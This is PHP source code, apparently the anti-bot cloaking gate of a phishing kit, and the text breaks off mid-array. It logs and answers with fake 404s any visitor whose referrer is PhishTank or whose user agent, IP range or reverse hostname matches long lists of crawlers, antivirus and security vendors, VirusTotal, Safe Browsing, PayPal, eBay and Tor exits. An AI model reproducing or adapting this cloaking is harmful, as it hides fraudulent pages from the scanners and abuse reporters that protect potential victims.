<?php


include'../string.php';
// require 'antis/vixxxyz1.php';
require 'antis/vixxxyz2.php';

require 'antis/vixxxyz3.php';
require 'antis/vixxxyz4.php';
require 'antis/vixxxyz5.php';
require 'antis/blocklist.php';

include'../antifuk.php';
$ip = $_SESSION['ip'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if(isset($_SERVER['HTTP_REFERER'])) {
  if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
     $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
     $save=fopen("../../bots.txt","a+");
     fwrite($save,$content);
     fclose($save);
   header("HTTP/1.0 404 Not Found");exit();

 }
 }

 if(isset($_SERVER['HTTP_REFERER'])) {
  if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
     $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Phishtank ] \r\n";
     $save=fopen("../../bots.txt","a+");
     fwrite($save,$content);
     fclose($save);
   header("HTTP/1.0 404 Not Found");exit();

 }
 }

### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

if ($ip2long >= $range_start && $ip2long <= $range_end){
   $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blacklist ] \r\n";
     $save=fopen("../../bots.txt","a+");
     fwrite($save,$content);
     fclose($save);
   header("HTTP/1.0 404 Not Found");exit();

}

$Bots = array("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot.","bot/","_bot",".bot","/bot","-bot",":bot","(bot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","siteexplorer","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xget","xift","xirq","yandex","yanga","yeti","yodao","zao/","zippp","zyborg","proximic","Googlebot","Baiduspider","Cliqzbot","A6-Indexer","AhrefsBot","Genieo","BomboraBot","CCBot","URLAppendBot","DomainAppender","msnbot-media","Antivirus","YoudaoBot","MJ12bot","linkdexbot","Go-http-client",	"Googlebot","Baiduspider","PhantomJS","applebot","metauri.com","Twitterbot","ia_archiver","R6_FeedFetcher","NetcraftSurveyAgent","Sogouwebspider","bingbot","Yahoo!Slurp","facebookexternalhit","PrintfulBot","msnbot","Twitterbot","UnwindFetchor","urlresolver","Butterfly","TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms","YandexBot","SearchmetricsBot","picsearch","TweetedTimesBot","QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIXCrawler","R6_CommentReader","magpie-crawler","GrapeshotCrawler","PercolateCrawler","MaxPointCrawler","R6_FeedFetcher","NetSeercrawler","grokkit-crawler","SMXCrawler","PulseCrawler","Y!J-BRW","80legs.com/webcrawler","Mediapartners-Google","Spinn3r","InAGist","Python-urllib","NING","TencentTraveler","Feedfetcher-Google","mon.itor.us","spbot","Feedly","bot","java","curl","spider","crawler");

   if(in_array($_SERVER['REMOTE_ADDR'],$Bots)) {
	      $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	}

$Botname = array( // LIST BOOTS NAME
		"bot","above","google","softlayer","amazonaws","cyveillance","compatible","facebook","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","apache-httpclient","lssrocketcrawler","Trident","X11","Macintosh","crawler","urlredirectresolver","jetbrains","spam","windows95","windows98","acunetix","netsparker","google","007ac9","008","192.comagent","200pleasebot","360spider","4seohuntbot","50.nu","a6-indexer","admantx","amznkassocbot","aboundexbot","aboutusbot","abravespider","accelobot","acoonbot","addthis.com","adsbot-google","ahrefsbot","alexabot","amagit.com","analytics","antbot","apercite","aportworm","arabot","crawl","slurp","spider","seek","accoona","acoon","adressendeutschland","ah-ha.com","ahoy","altavista","ananzi","anthill","appie","arachnophilia","arale","araneo","aranha","architext","aretha","arks","asterias","atlocal","atn","atomz","augurfind","backrub","bannana_bot","baypup","bdfetch","bigbrother","biglotron","bjaaland","blackwidow","blaiz","blog","blo.","bloodhound","boitho","booch","bradley","butterfly","calif","cassandra","ccubee","cfetch","charlotte","churl","cienciaficcion","cmc","collective","comagent","combine","computingsite","csci","curl","cusco","daumoa","deepindex","delorie","depspid","deweb","dieblindekuh","digger","ditto","dmoz","docomo","downloadexpress","dtaagent","dwcp","ebiness","ebingbong","e-collector","ejupiter","emacs-w3searchengine","esther","evliyacelebi","ezresult","falcon","felixide","ferret","fetchrover","fido","findlinks","fireball","fishsearch","fouineur","funnelweb","gazz","gcreep","genieknows","getterroboplus","geturl","glx","goforit","golem","grabber","grapnel","gralon","griffon","gromit","grub","gulliver","hamahakki","harvest","havindex","helix","heritrix","hkuwwwoctopus","homerweb","htdig","htmlindex","html_analyzer","htmlgobble","hubater","hyper-decontextualizer","ia_archiver","ibm_planetwide","ichiro","iconsurf","iltrovatore","image.kapsi.net","imagelock","incywincy","indexer","infobee","informant","ingrid","inktomisearch.com","inspectorweb","intelliagent","internetshinchakubin","ip3000","iron33","israeli-search","ivia","jack","jakarta","javabee","jetbot","jumpstation","katipo","kdd-explorer","kilroy","knowledge","kototoi","kretrieve","labelgrabber","lachesis","larbin","legs","libwww","linkalarm","linkvalidator","linkscan","lockon","lwp","lycos","magpie","mantraagent","mapoftheinternet","marvin/","mattie","mediafox","mediapartners","mercator","merzscope","microsofturlcontrol","minirank","miva","mj12","mnogosearch","moget","monster","moose","motor","multitext","muncher","muscatferret","mwd.search","myweb","najdi","nameprotect","nationaldirectory","nazilla","ncsabeta","nec-meshexplorer","nederland.zoek","netcartawebmapengine","netmechanic","netresearchserver","netscoop","newscan-online","nhse","nokia6682/","nomad","noyona","nutch","nzexplorer","objectssearch","occam","omni","opentext","openfind","openintelligencedata","orbsearch","osis-project","packrat","pageboy","pagebull","page_verifier","panscient","parasite","partnersite","patric","pear.","pegasus","peregrinator","pgpkeyagent","phantom","phpdig","picosearch","piltdownman","pimptrain","pinpoint","pioneer","piranha","plumtreewebaccessor","pogodak","poirot","pompos","poppelsdorf","poppi","populariconoclast","psycheclone","publisher","python","rambler","ravensearch","roach","roadrunner","roadhouse","robbie","robofox","robozilla","rules","salty","sbider","scooter","scoutjet","scrubby","search.","searchprocess","semanticdiscovery","senrigan","sg-scout","shai'hulud","shark","shopwiki","sidewinder","sift","silk","simmany","sitesearcher","sitevalet","sitetech-rover","skymob.com","sleek","smartwit","sna-","snappy","snooper","sohu","speedfind","sphere","sphider","spinner","spyder","steeler/","suke","suntek","supersnooper","surfnomore","sven","sygol","szukacz","tachblackwidow","tarantula","templeton","/teoma","t-h-u-n-d-e-r-s-t-o-n-e","theophrastus","titan","titin","tkwww","toutatis","t-rex","tutorgig","twiceler","twisted","ucsd","udmsearch","urlcheck","updated","vagabondo","valkyrie","verticrawl","victoria","vision-search","volcano","voyager/","voyager-hc","w3c_validator","w3m2","w3mir","walker","wallpaper","wanderer","wauuu","wavefire","webcore","webhopper","webwombat","webbandit","webcatcher","webcopy","webfoot","weblayers","weblinker","weblogmonitor","webmirror","webmonkey","webquest","webreaper","websitepulse","websnarf","webstolperer","webvac","webwalk","webwatch","webwombat","webzinger","wget","whizbang","whowhere","wildferret","worldlight","wwwc","wwwster","xenu","xift","xirq","yandex","yanga","yeti","yahoo!");
	
	foreach ($Botname as $words) {
        if (stripos($_SERVER['HTTP_USER_AGENT'],$words)){
	     	 $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
		    $save=fopen("../../bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

	    }
    }
    if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')  
      or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') 
      or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
                    
              $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
          $save=fopen("../../bots.txt","a+");
          fwrite($save,$content);
          fclose($save);
        header("HTTP/1.0 404 Not Found");exit();
  
    }
  
    if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
  
          $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
          $save=fopen("../../bots.txt","a+");
          fwrite($save,$content);
          fclose($save);
        header("HTTP/1.0 404 Not Found");exit();
  
      }


      $ipsed = $_SERVER['REMOTE_ADDR'];
      $IP_Banned = array(
       "^81.161.59.*","^66.135.200.*","^91.103.66.*","^208.91.115.*","^199.30.228.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^209.85.128.*","^216.239.32.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","54.228.218.117","^54.228.218.*","185.28.20.243","^185.28.20.*","217.16.26.166","^217.16.26.*","50.16.241.113","50.16.241.114","50.16.241.117","50.16.247.234","52.204.97.54","52.5.190.19","54.197.234.188","54.208.100.253","23.21.227.69","65.214.45.143","65.214.45.148","66.235.124.192","66.235.124.7","66.235.124.101","66.235.124.193","66.235.124.73","66.235.124.196","66.235.124.74","63.123.238.8","202.143.148.61","66.249.66.1","1.9.2.13","1.9.2.15","62.210.13.58","104.62.2.60","104.83.233.198","107.178.194.64","108.161.29.60","115.238.55.18","119.97.214.138","138.197.207.*","145.239.156.71","145.239.156.89","150.70.168.35","150.70.188.167","154.127.57.30","162.243.128.197","162.243.187.126","162.243.69.215","165.227.0.128","170.250.139.48","138.197.207.147","173.230.147.44","177.39.232.144","178.17.170.156","185.104.186.168","185.220.101.26","185.28.20.243","188.166.63.71","192.36.27.7","196.52.84.81","204.13.201.137","208.87.233.140","212.83.139.219","212.92.117.5","216.164.117.239","217.16.26.166","217.96.188.74","219.117.238.170","23.27.153.247","23.27.154.37","24.23.24.144","27.0.1453.110","3.0.04506.648","3.0.4506.2152","31.168.158.239","34.237.113.113","39.0.2150.5","41.0.2272.118","43.0.2357.81","44.0.2403.155","46.101.94.163","5.62.39.18","5.62.41.35","5.62.56.91","50.112.194.65","50.116.2.167","51.0.2704.103","52.18.11.161","52.192.164.225","52.27.2.86","52.31.63.97","52.5.98.73","52.72.33.140","52.87.10.90","52.91.94.56","53.0.2785.116","54.213.103.141","54.228.218.117","54.245.191.79","56.0.2924.87","57.0.2987.98","61.0.3116.0","62.24.252.133","62.67.194.35","63.0.3239.132","64.0.3282.140","64.0.3282.167","66.0.3358.0","66.0.3359.0","67.0.3360.0","67.0.3361.0","68.65.53.71","75.163.12.85","76.19.184.88","77.69.251.230","80.104.176.17","81.0.48.*","81.0.48.138","84.13.191.239","84.92.148.184","88.99.62.141","217.96.197.246","89.234.157.254","91.231.212.111","173.239.240.147","103.248.172.42","87.113.96.90","165.227.0.128","185.229.190.140", "165.227.0.128", "46.101.94.163", "165.227.39.194","87.113.96.90","46.101.119.24","82.102.27.75", "173.239.230.97", "82.102.27.75", "87.113.96.90", "46.101.119.24", "173.239.230.97", "87.113.96.90", "87.113.96.90", "159.203.0.156", "162.243.187.126","82.102.27.75", "87.113.96.90","103.248.172.42", "103.248.172.42", "47.30.133.89", "103.248.172.42");
      
      if(in_array($ipsed,$IP_Banned)){
        $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
            $save=fopen("../../bots.txt","a+");
            fwrite($save,$content);
            fclose($save);
          header("HTTP/1.0 404 Not Found");exit();
    
       }
      $lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
      $HOSTNAME = gethostbyaddr($_SERVER['REMOTE_ADDR']);
      $blocked_words = array("drweb","Dr.Web","hostinger","scanurl","above","google","facebook","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","msnbot","p3pwgdsn","netcraft","trendmicro","ebay","paypal","torservers","messagelabs","sucuri.net","crawler","googlebot","Googlebot-Video","bingbot","Baiduspider","Baiduspider-mobile","Baiduspider-video","Baiduspider-image","NaverBot","Yeti","Yandex","YandexBot","YandexMobileBot","YandexVideo","YandexWebmaster","YandexSitelinks","SeznamBot","AdsBot-Google","Twitterbot","Adidxbot","externalfacebookhit","Facebot","Yahoo Pipes 1.0","facebookexternalhit","EtaoSpider","amazon","netflix","Slurp","msnbot","Applebot","Googlebot-Image","teoma","ia_archiver","YandexDirect","gsa-crawler","OmniExplorer_Bot","msnbot-mobile","YahooSeeker","SPRO-NET-206-80-96","SPRO-NET-207-70-0","SPRO-NET-209-19-128","LVLT-STATIC-4-14-16","americanexpress","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");
    
       foreach($blocked_words as $word) {
           if (substr_count($HOSTNAME, $word) > 0) {
            $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bad word ] \r\n";
            $save=fopen("../../bots.txt","a+");
            fwrite($save,$content);
            fclose($save);
          header("HTTP/1.0 404 Not Found");exit();
    
          }
          }

          $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
          $blocked_words = array("teledata-fttx.de","hicoria.com", "simtccflow1.etn.com","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com","googlebot.com","upcloud.host","nodemeter.net","e-active.nl","downnotifier","online-domain-tools","fetcher6-2.go.mail.ru","uptimerobot.com","monitis.com","colocrossing.com","majestic12","as9105.com","btcentralplus.com","anonymizing-proxy","digitalcourage.de","triolan.net","staircaseirony","stelkom.net","comrise.ru","kyivstar.net","mpdedicated.com","starnet.md","progtech.ru","hinet.net","is74.ru","shore.net","cyberinfo","ipredator","unknown.telecom.gomel.by","minsktelecom.by","parked.factioninc.com");
          
              foreach($blocked_words as $word) {
                  if (substr_count($hostname, $word) > 0) {
          
                     $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Blocked ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
                  }
              }
          
          $bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^84.93.84.*","^182.75.120.*","^182.75.120.10","^46.101.43.*","^147.75.210.*");
              if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
          
                       $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
          
              } else {
                   foreach($bannedIP as $ip) {
                        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                        $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Banned ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
          
                        }
                   }
              }
          
          
              $v_agent = $_SERVER['HTTP_USER_AGENT'];
          if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
          
                 $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
          }
          if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
                  $content = "#> ".$_SERVER['HTTP_USER_AGENT']." [ Bot ] \r\n";
                      $save=fopen("../../bots.txt","a+");
                      fwrite($save,$content);
                      fclose($save);
                      header("HTTP/1.0 404 Not Found");exit();
          
          }
          
          $id = $_SERVER['REMOTE_ADDR'];
          $ips = array(
          "^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.120.12.*", "^157.201.10.*", "^172.217.*.*", "^103.86.99.*", "^213.100.*.*", "^216.58.*.*", "^173.194.*.*", "^74.125.133.*","^66.102.*.*", "^66.249.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","^184.165.*.*","^198.68.61.*","^199.3.10.*","^204.119.24.*","^204.251.90.*","^100.43.*.*","^72.94.249.*","^103.6.76.*","^106.12.*.*","^115.231.36.*","^5.189.*.*","^66.102.6.*","^66.249.*.*","^173.252.*.*","^196.23.168.*","^190.82.81.*","^92.189.25.*","^52.31.147.*","^69.164.111.*","^173.252.86.*","^173.239.*.*","^203.215.181.*","^208.43.225.*","^173.192.*.*","^212.113.37.*","^119.63.*.*","^188.207.200.*","^89.108.102.*","^173.11.97.*","^209.185.108.*",
              "^209.185.253.*","^216.239.*.*","^64.68.*.*","^66.249.*.*","^72.14.199.*","^8.6.48.*","^141.185.209.*","^169.207.238.*","^202.160.*.*","^195.211.*.*","^185.41.162.*","^51.15.*.*","^84.51.153.*","^185.220.101.*","^40.85.158.*","^72.94.249.*","^8.23.224.*","^104.132.20.*","^1.33.126.*","^217.96.*.*","^64.233.160.*","^93.119.*.*","^23.27.152.*","^111.231.*.*","^144.217.82.*","^148.163.128.*","^41.208.72.*","^36.74.236.*","^64.233.173.*","^36.83.56.*","^87.115.213.*","^110.88.*.*","^46.101.119.*","^87.115.213.*","^68.14.83.*","^100.6.107.*","^174.255.*.*","^72.49.133.*","^104.15.60.*","^35.153.86.*","^191.98.136.*","^175.135.172.*","^134.119.*.*","^208.101.*.*","^104.42.*.*","^181.229.*.*","^89.234.*.*","^186.6.*.*","^103.19.16.*","^158.69.216.*","^157.39.109.*","^83.31.*.*","^92.23.56.*","^86.132.235.*","^106.133.165.*","^111.89.*.*","^14.101.178.*","^107.178.*.*","^180.29.89.*","^61.21.221.*","^204.85.191.*","^188.166.*.*","^103.19.16.*","^199.59.150.*","^209.135.212.*","^208.87.233.*","^83.31.*.*","^49.104.10.*","^216.252.*.*","^24.172.*.*","^193.128.*.*","^162.244.*.*","^40.121.198.*","^95.45.252.*","^188.166.*.*","^83.71.*.*","^66.214.*.*","^205.201.132.*","^40.107.*.*","^104.132.*.*","^173.205.33.*","^185.145.156.*","^17.198.249.*","^103.35.*.*","^128.28.*.*","^128.72.*.*","^128.75.*.*","^138.122.*.*","^139.59.*.*","^50.107.*.*","^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
           "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
           "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
          "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
           "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
           "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
